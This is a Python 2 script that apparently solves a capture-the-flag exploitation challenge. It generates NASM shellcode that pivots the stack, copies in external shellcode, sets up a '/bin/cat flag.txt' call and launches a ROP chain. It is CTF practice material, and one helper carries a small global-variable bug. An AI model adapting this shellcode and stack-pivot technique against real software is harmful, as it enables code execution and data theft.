import struct

def nopify(lines):
    for i in range(5):
        lines.append('nop')

def write_start_shit(lines):
    lines.append('global _start')
    lines.append('')
    lines.append('_start:')
    
def write_get_pivot_to_r14(lines):
    lines.append('lea r13, [rbp - 72]')
    nopify(lines)
    lines.append('mov r14, [r13]')
    nopify(lines)

def add_offset_r13_to_r14(lines, offset):
    lines.append('lea r14, [r13 + %d]' % offset)
    nopify(lines)
    
def add_offset_r14_to_r13(lines, offset):
    lines.append('lea r13, [r14 + %d]' % offset)
    nopify(lines)
    
def mov_byte_to_r14(lines, byte):
    lines.append('mov byte [r14], %d' % byte)
    nopify(lines)
    
def mov_byte_to_r13(lines, byte):
    lines.append('mov byte [r13], %d' % byte)
    nopify(lines)
    
def add_huge_to_r14(lines,big_offset):
    lines.append('add r14, %d' % big_offset)
    nopify(lines)
    
def stack_to_r13(lines, offset):
    lines.append('lea r13, [rbp + %d]' % offset)
    nopify(lines)
    
def stack_to_r14(lines, offset):
    lines.append('lea r14, [rbp + %d]' % offset)
    nopify(lines)
    
def r14_to_addr_r13(lines):
    lines.append('mov [r13], r14')
    nopify(lines)
    
def rbp_offset_to_rsp(lines, offset):
    lines.append('lea rsp, [rbp + %d]' % offset)
    nopify(lines)
    
def add_big_offset_to_r14(lines, offset):
    MAX_OFFSET = 126
    
    big_offset = (offset) / 0x1000
    big_offset_rem = big_offset % (MAX_OFFSET)
    offset = offset % (0x1000)
    for i in range(big_offset / MAX_OFFSET):
        add_huge_to_r14(lines, MAX_OFFSET)
    add_huge_to_r14(lines, big_offset_rem)
    
    times_to_faddress = (offset) / (MAX_OFFSET * 2)
    remainder = (offset) % (MAX_OFFSET * 2)
    for i in range(times_to_faddress):
        add_offset_r14_to_r13(lines, MAX_OFFSET)
        add_offset_r13_to_r14(lines, MAX_OFFSET)
    if remainder > MAX_OFFSET:
        add_offset_r14_to_r13(lines, MAX_OFFSET)
        add_offset_r13_to_r14(lines, remainder - MAX_OFFSET)
    else:
        add_offset_r14_to_r13(lines, remainder)
        add_offset_r13_to_r14(lines, 0)

def mov_string_to_r14(lines,string):    
    for ch in string:
        mov_byte_to_r14(lines, ord(ch))
        add_offset_r14_to_r13(lines, 1)
        add_offset_r13_to_r14(lines, 0)

def write_string_to_stack(lines, offset, string):
    i = 0 
    for ch in string:
        stack_to_r14(shell_lines, offset + i)
        mov_byte_to_r14(lines, ord(ch))
        i += 1

def write_offset_to_stack(lines, write_offset, read_offset):
    stack_to_r13(lines, write_offset)
    stack_to_r14(lines, read_offset)
    r14_to_addr_r13(lines)
        
pivot_address = 0xaa3
write_address = 0x202000
read_addr_1 = 0xaab
read_addr_2 = 0xb00
INITIAL_OFFSET = 8 * 4
shell_lines = []

# write start
write_start_shit(shell_lines)

# write getting to pivot
write_get_pivot_to_r14(shell_lines)
add_offset_r14_to_r13(shell_lines, read_addr_1 - pivot_address)
add_offset_r13_to_r14(shell_lines, 0)

# write to stack
stack_to_r13(shell_lines, INITIAL_OFFSET)
r14_to_addr_r13(shell_lines)

# write getting to pivot
add_offset_r14_to_r13(shell_lines, read_addr_2 - read_addr_1)
add_offset_r13_to_r14(shell_lines, 0)

# write to stack
stack_to_r13(shell_lines, INITIAL_OFFSET + 32)
r14_to_addr_r13(shell_lines)

# write getting to pivot
add_big_offset_to_r14(shell_lines, write_address - read_addr_2)

# write to stack
stack_to_r13(shell_lines, INITIAL_OFFSET + 8)
r14_to_addr_r13(shell_lines)

# writing shellcode to read/write data
to_write = open('shellcode_ex', 'rb').read()
mov_string_to_r14(shell_lines, to_write)

# new segment of code!! stack writing all stuff
write_string_to_stack(shell_lines, INITIAL_OFFSET + 40 + 24, '/bin/cat\x00')
write_string_to_stack(shell_lines, INITIAL_OFFSET + 40 + 40, 'flag.txt\x00')
write_offset_to_stack(shell_lines, INITIAL_OFFSET + 40, INITIAL_OFFSET + 40 + 24)
write_offset_to_stack(shell_lines, INITIAL_OFFSET + 40 + 8, INITIAL_OFFSET + 40 + 40)
write_string_to_stack(shell_lines, INITIAL_OFFSET + 40 + 16, '\x00' * 8)

# do the rop
rbp_offset_to_rsp(shell_lines, INITIAL_OFFSET)

# saving the shit
print len(shell_lines)
with open('shellcode.asm' ,'wb') as shellf:
    shellf.writelines([shell_line + '\n' for shell_line in shell_lines])